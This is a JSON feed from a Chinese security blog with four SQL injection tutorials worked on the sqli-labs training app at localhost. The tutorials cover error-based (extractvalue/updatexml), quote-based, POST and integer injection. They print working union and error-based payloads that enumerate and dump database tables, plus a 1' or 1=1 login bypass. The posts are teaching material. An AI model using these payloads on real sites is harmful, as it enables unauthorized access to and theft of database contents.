{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "title": "报错注入",
            "date_published": "2022-09-29T15:57:38.000Z",
            "content_html": "<h1 id=\"sql-注入之报错注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之报错注入\">#</a> SQL 注入之报错注入</h1>\n<p>本篇使用报错注入。</p>\n<p><code>注意</code> ：报错函数的使用中，第二个参数如果来自于查询语句，都是<strong>需要用小括号包裹起来的</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#使用 extractvalue(1, (select xxx))</span><br><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br><span class=\"line\"></span><br><span class=\"line\">#使用 updatexml(1, (select xxx), 1)</span><br><span class=\"line\">uname=1&#x27; union select 1, updatexml(1, concat(&#x27;%&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"设置代理\"><a class=\"markdownIt-Anchor\" href=\"#设置代理\">#</a> 设置代理</h3>\n<p>还是 Less-11，我们挂上<strong> BurpSuit</strong> 代理，然后<strong> Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220929231322659.png\" alt=\"image-20220929231322659\"></p>\n<p>报错注入常使用的函数如下：</p>\n<p><strong>extractvalue</strong> (): 从目标 XML 中返回包含所查询值的字符串。</p>\n<p>例子：extractvalue (XML_document, XPath_string);</p>\n<p>** 第一个参数：**XML_documentshi String 格式，为 XML 文档对象的名称。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<p>** 第二个参数：**XPath_string (Xpath 格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p>concat ()：返回结果为连接参数产生的字符串。</p>\n<p><strong>updatexml</strong>(XML_document, XPath_string, new_value);</p>\n<p>** 第一个参数：**XML_document 是 String 格式，为 XML 文档对象的名称。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<p>** 第二个参数：**XPath_string (XPATH 格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p>** 第三个参数：**new_value, String 格式， 替换查找到的符合条件的数据。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<h3 id=\"确定注入类型和列数\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型和列数\">#</a> 确定注入类型和列数</h3>\n<p>通过单引号注入和 order by n 来<strong>确定注入类型</strong>和<strong>查询列数</strong>。</p>\n<p><img src=\"image-20220929232026560.png\" alt=\"image-20220929232026560\"></p>\n<h3 id=\"使用指定报错函数\"><a class=\"markdownIt-Anchor\" href=\"#使用指定报错函数\">#</a> 使用指定报错函数</h3>\n<p>那么我们就可构造：</p>\n<p>extractvalue (1, XPATH_string)，其中 XPATH_string 为 (select version ())</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, (select version())) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233031785.png\" alt=\"image-20220929233031785\"></p>\n<p>可以看到版本号被截断，信息不全。我们尝试调 concat () 函数使用 0x7e 字符拼接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(0x7e, (select version()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233343167.png\" alt=\"image-20220929233343167\"></p>\n<p>这里分割字符串可以换成 %，分割字符串的选择比较看运气，有时候后台会校验，所以多用 ASCII 来表示。<strong>比如波浪线的 ASCII 为 0x7e</strong></p>\n<p><img src=\"image-20220929233647634.png\" alt=\"image-20220929233647634\"></p>\n<h3 id=\"泄露数据库信息\"><a class=\"markdownIt-Anchor\" href=\"#泄露数据库信息\">#</a> 泄露数据库信息</h3>\n<p>准备泄露数据库的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>但是报了错， <code>Subquery returns more than 1 row</code> ，说明最后查询的 select 的列数超过了一列。</p>\n<p><img src=\"image-20220929233914430.png\" alt=\"image-20220929233914430\"></p>\n<p>我们需要使用 limit 0,1 限制一列输出</p>\n<p><img src=\"image-20220929234118900.png\" alt=\"image-20220929234118900\"></p>\n<p>或者<strong>使用 group_concat 拼接成一列</strong></p>\n<p><img src=\"image-20220929234238245.png\" alt=\"image-20220929234238245\"></p>\n<p>同理，也使用 updatexml 进行报错注入</p>\n<p>构造时，因为我们关键是为了调用 <code>updatexml</code>  函数和使用 <code>第二个参数</code> 进行内容输出，因此<strong>第一个参数</strong>和<strong>第三个参数</strong>都是 **“无用”** 的，设置成 1 即可。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; union select 1, updatexml(1, concat(&#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929234443551.png\" alt=\"image-20220929234443551\"></p>\n<p>至此，报错注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "字符型注入",
            "date_published": "2022-09-29T13:54:18.000Z",
            "content_html": "<h1 id=\"sql-注入之字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之字符型注入\">#</a> SQL 注入之字符型注入</h1>\n<p>本篇使用字符型注入。</p>\n<h2 id=\"注入步骤单引号注入\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤单引号注入\">#</a> 注入步骤 (单引号注入)</h2>\n<p>由于 Less-1 从请求上看到是 GET 型，所以礼节性地输入个 id=1</p>\n<p><img src=\"image-20220929215708949.png\" alt=\"image-20220929215708949\"></p>\n<h3 id=\"尝试注入类型\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929215814839.png\" alt=\"image-20220929215814839\"></p>\n<p>输入 22’  来看看是否报错</p>\n<p><img src=\"image-20220929215843779.png\" alt=\"image-20220929215843779\"></p>\n<p>那么， <code>'22'' LIMIT 0,1</code>  中，‘22’’  外面包裹的两个单引号是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型\">#</a> 确定注入类型</h3>\n<p>闭合单引号，需要在输入中添加一个单引号之后，使用行注释符注释后面的代码，常用的有: #、%23、–+</p>\n<p>那么，我们尝试一下 #号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; #</span></span><br></pre></td></tr></table></figure>\n<p>不行，会报错，可能后台过滤了 #号。</p>\n<p><img src=\"image-20220929220358319.png\" alt=\"image-20220929220358319\"></p>\n<p>尝试 %23 也一样，就不再贴图了。</p>\n<p>我们最后尝试–+，成功。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220326957.png\" alt=\"image-20220929220326957\"></p>\n<p>由此，可以确定此题注入类型为字符型注入的<strong>单引号注入</strong>。</p>\n<h3 id=\"确定列数\"><a class=\"markdownIt-Anchor\" href=\"#确定列数\">#</a> 确定列数</h3>\n<p>使用 order by n 来确定有多少列。<strong>order by n</strong> 会以当前表中的 “<strong>第 n 列</strong>” 进行排序，如果<strong>第 n 列不存在</strong>，则会抛出 <code>Unknown column 'n' </code> 的异常。</p>\n<p>4 列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220842238.png\" alt=\"image-20220929220842238\"></p>\n<p>3 列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220533059.png\" alt=\"image-20220929220533059\"></p>\n<p><strong>不报错，则说明有 3 列</strong>。</p>\n<h3 id=\"构造联合查询泄露数据库信息\"><a class=\"markdownIt-Anchor\" href=\"#构造联合查询泄露数据库信息\">#</a> 构造联合查询泄露数据库信息</h3>\n<p>这回我们使用 <code>and 0</code>  来构造对于 id 的查询为假的条件</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(table_name), database() from information_schema.tables where table_schema = database() --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929221156300.png\" alt=\"image-20220929221156300\"></p>\n<h2 id=\"注入步骤双引号注入\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤双引号注入\">#</a> 注入步骤 (双引号注入)</h2>\n<p>Less-4 是一道双引号注入的题目。</p>\n<p><img src=\"image-20220929221450837.png\" alt=\"image-20220929221450837\"></p>\n<p>由于查看发现是 GET 请求，因此理解性地输入 id=1</p>\n<p><img src=\"image-20220929221657747.png\" alt=\"image-20220929221657747\"></p>\n<h3 id=\"尝试注入类型-2\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型-2\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929221831821.png\" alt=\"image-20220929221831821\"></p>\n<p>不报错，怀疑存在双引号注入。</p>\n<p>输入 1“  来看看是否报错</p>\n<p><img src=\"image-20220929221918225.png\" alt=\"image-20220929221918225\"></p>\n<p>那么， <code>&quot;1&quot;&quot;) LIMIT 0,1</code>  中，“1&quot;”)  外面包裹的【两个双引号 + 一个小括号】是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型-2\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型-2\">#</a> 确定注入类型</h3>\n<p>我们尝试：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-4</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;) --+</span><br></pre></td></tr></table></figure>\n<p>成功不报错。</p>\n<p><img src=\"image-20220929222215596.png\" alt=\"image-20220929222215596\"></p>\n<p>之后就可以愉快地<strong>确定列数</strong> + 使用<strong>联合查询泄露数据库信息</strong>了。</p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>通过闭合，确定单引号注入</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定列数为3</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">3</span> <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; order by 4 --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">sql查询失败</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.联合查询泄露数据库信息</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span>database() <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: emails,flag,users</span><br><span class=\"line\">Password: challenge</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&#x27;</span>flag<span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: flag,value</span></span><br><span class=\"line\"><span class=\"string\">Password: challenge</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.获取flag</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, flag, <span class=\"keyword\">value</span>)), database() <span class=\"keyword\">from</span> challenge.flag <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:<span class=\"keyword\">any</span>,flag8:sqlc,flag9:tasi,flag10:moo,flag12:<span class=\"literal\">false</span>,flag11:muse</span><br><span class=\"line\">Password: challenge</span><br></pre></td></tr></table></figure>\n<p>至此，字符型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "title": "POST注入",
            "date_published": "2022-09-29T13:49:22.000Z",
            "content_html": "<h1 id=\"sql-注入之post注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之post注入\">#</a> SQL 注入之 POST 注入</h1>\n<p>本篇使用 POST 注入。</p>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"尝试注入类型\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929203645441.png\" alt=\"image-20220929203645441\"></p>\n<p>果不其然，此输入框存在 SQL 注入。且报错信息为 <code>use near ''1'' and password='' LIMIT 0,1' at line 1</code></p>\n<p>提取出错点发生在这一句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;1&#x27;&#x27; and password=&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>其中，1’ 是我们输入的，那么其查询语句基本上可以确定为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>接着，查看其 F12 发现，网页发送的是 POST 请求。</p>\n<p><img src=\"image-20220929204011334.png\" alt=\"image-20220929204011334\"></p>\n<p>然后通过继续深入查询网页源代码的 Elements 可以得到，两个 <code>&lt;input&gt;</code>  标签对应的变量名，<strong>Username</strong> 对应<strong> uname</strong>，<strong>Password</strong> 对应<strong> passwd</strong></p>\n<p><img src=\"image-20220929204648604.png\" alt=\"image-20220929204648604\"></p>\n<p>那么就可以构造 POST 请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929204929486.png\" alt=\"image-20220929204929486\"></p>\n<p>那么，基本上可以确定，此题存在 SQL 注入之一 ——POST 注入。</p>\n<h3 id=\"确定注入类型\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型\">#</a> 确定注入类型</h3>\n<p>输入 1’ # 查看是否依旧报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>不报错，说明是 POST 单引号注入。</p>\n<p><img src=\"image-20220929205132216.png\" alt=\"image-20220929205132216\"></p>\n<h3 id=\"是否可以构造非法查询\"><a class=\"markdownIt-Anchor\" href=\"#是否可以构造非法查询\">#</a> 是否可以构造非法查询</h3>\n<p>由于</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>username 是用单引号括起来的，为了让语法不出错，我们需要<strong>保留单引号</strong>。即，可以在 <code>uname=1' #&amp;passwd=1</code>  的 <code>' #</code> 之间<strong>插入我们想要的非法查询语句</strong>。</p>\n<p>因此，我们可以输入 1’ or 1=1 # 万能登录注入就会让查询语句变成：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span> #<span class=\"string\">&#x27; and password = &#x27;</span>xxx<span class=\"string\">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>构造 POST 请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>登录成功:</p>\n<p><img src=\"image-20220929205718001.png\" alt=\"image-20220929205718001\"></p>\n<h2 id=\"使用burpsuit来做post注入\"><a class=\"markdownIt-Anchor\" href=\"#使用burpsuit来做post注入\">#</a> 使用 BurpSuit 来做 Post 注入</h2>\n<p>这里也稍微提及一下 BurpSuit 抓包工具的简单使用：</p>\n<h3 id=\"firefox浏览器配置\"><a class=\"markdownIt-Anchor\" href=\"#firefox浏览器配置\">#</a> FireFox 浏览器配置</h3>\n<p>FireFox 浏览器中，在” 工具栏 — 选项 — 高级 — 连接设置 “中，配置手动代理和端口号 (127.0.0.1 : <strong>9090</strong>)</p>\n<p><img src=\"image-20220929210357211.png\" alt=\"image-20220929210357211\"></p>\n<h3 id=\"burpsuit配置\"><a class=\"markdownIt-Anchor\" href=\"#burpsuit配置\">#</a> BurpSuit 配置</h3>\n<p>到 BurpSuit 里，”Proxy—Options—Proxy Listeners“中，设置好同样的代理地址和端口号（127.0.0.1 : <strong>9090</strong>）</p>\n<p><img src=\"image-20220929210527792.png\" alt=\"image-20220929210527792\"></p>\n<h3 id=\"令burpsuit拦截到包\"><a class=\"markdownIt-Anchor\" href=\"#令burpsuit拦截到包\">#</a> 令 BurpSuit 拦截到包</h3>\n<p>点击 FireFox 的任意提交请求的按钮就可以令 BurpSuit 拦截到包。以 FireFox 为例就是，点击了这道题目中的 <code>Submit按钮</code>  或 使用 Hackbar 的 <code>Execute按钮</code> 。</p>\n<p><img src=\"image-20220929210640596.png\" alt=\"image-20220929210640596\"></p>\n<p>④在内容中鼠标右键点击后选择 Send to Reapeater</p>\n<p><img src=\"image-20220929210828967.png\" alt=\"image-20220929210828967\"></p>\n<p>⑤在 Reapter 中多次尝试修改注入内容来查看返回的包</p>\n<p>第一次注入尝试</p>\n<p><img src=\"image-20220929211038588.png\" alt=\"image-20220929211038588\"></p>\n<p>第二次注入尝试</p>\n<p><img src=\"image-20220929210956005.png\" alt=\"image-20220929210956005\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "整型注入",
            "date_published": "2022-09-28T16:27:56.000Z",
            "content_html": "<h1 id=\"sql注入之整型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之整型注入\">#</a> SQL 注入之整型注入</h1>\n<p>本篇使用整型注入来从 0 到 1 进入 “SQL 注入” 的大门。</p>\n<h2 id=\"环境准备\"><a class=\"markdownIt-Anchor\" href=\"#环境准备\">#</a> 环境准备</h2>\n<p>当然是先安装 phpStudy，然后一键傻瓜式安装后点击启动按钮</p>\n<p><img src=\"image-20220928202842147.png\" alt=\"image-20220928202842147\"></p>\n<p>之后点击 MySQL 管理器</p>\n<p><img src=\"image-20220928203059624.png\" alt=\"image-20220928203059624\"></p>\n<p>双击 localhost，账户名 root，密码 root 即可进入。</p>\n<p><img src=\"image-20220928203206981.png\" alt=\"image-20220928203206981\"></p>\n<p>打开浏览器，选择 sqli</p>\n<p><img src=\"image-20220928203903223.png\" alt=\"image-20220928203903223\"></p>\n<p>选择第一个 Setup</p>\n<p><img src=\"image-20220928203930840.png\" alt=\"image-20220928203930840\"></p>\n<p>出现这个界面，即完成了数据库的初始化</p>\n<p><img src=\"image-20220928203950837.png\" alt=\"image-20220928203950837\"></p>\n<p>点击后退键回到上一个页面，然后点击 Less-1</p>\n<p><img src=\"image-20220928204115026.png\" alt=\"image-20220928204115026\"></p>\n<p>出现 SQLI DUMB SERIES-1</p>\n<p><img src=\"image-20220928204123886.png\" alt=\"image-20220928204123886\"></p>\n<p>接下来以 Less-2 作为例子进行讲解：</p>\n<p><img src=\"image-20220928210728567.png\" alt=\"image-20220928210728567\"></p>\n<h2 id=\"sql注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#sql注入步骤\">#</a> SQL 注入步骤</h2>\n<h3 id=\"1判断是否有注入判断是否未严格校验\"><a class=\"markdownIt-Anchor\" href=\"#1判断是否有注入判断是否未严格校验\">#</a> ①判断是否有注入 (判断是否未严格校验)</h3>\n<h4 id=\"1可控参数的改变能否影响页面的显示结果\"><a class=\"markdownIt-Anchor\" href=\"#1可控参数的改变能否影响页面的显示结果\">#</a> 1) 可控参数的改变能否影响页面的显示结果</h4>\n<p>网页让输入 id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。</p>\n<p>点击查看网页源代码，在 Network 这里看到是 GET 请求。</p>\n<p><img src=\"image-20220928213756712.png\" alt=\"image-20220928213756712\"></p>\n<p>因此我们选择在链接后面加上 id 参数</p>\n<p><img src=\"image-20220928213510534.png\" alt=\"image-20220928213510534\"></p>\n<p>发现成功令其输出内容。</p>\n<p>此时我们再次改变 GET 请求中 id 的值，发现，内容会对应有所变化。</p>\n<p><img src=\"image-20220928214022889.png\" alt=\"image-20220928214022889\"></p>\n<h4 id=\"2输入的sql语句是否能报错\"><a class=\"markdownIt-Anchor\" href=\"#2输入的sql语句是否能报错\">#</a> 2) 输入的 SQL 语句是否能报错</h4>\n<p>因为能通过数据库的报错，看到数据库的一些语句痕迹</p>\n<p>我们假设它后台的查询语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> $id</span><br></pre></td></tr></table></figure>\n<p>猜想：能否通过加单引号令其出错？</p>\n<p>因为：</p>\n<p>如果是整型注入漏洞，则像 3’这样的字符传入 $id 处会引发错误。</p>\n<p>如果是单引号注入漏洞，像 3’这样的字符传入 $id 处也会引发错误。</p>\n<p><img src=\"image-20220928214501924.png\" alt=\"image-20220928214501924\"></p>\n<p>黄字部分的报错语句，非常之重要！</p>\n<p>near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第 1 行的 xxxxxxx 语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是 “输出了单引号后面的语句”——LIMIT 0,1。</p>\n<p>为了再次确定 near ‘xxxxxxxxxx’ at line 1 中在 LIMIT 0,1 之前的一个单引号是我们输入的单引号，我们再次改变 GET 请求中 &quot;’ '&quot;（单引号）变为 &quot;&quot;&quot;（双引号）</p>\n<p><img 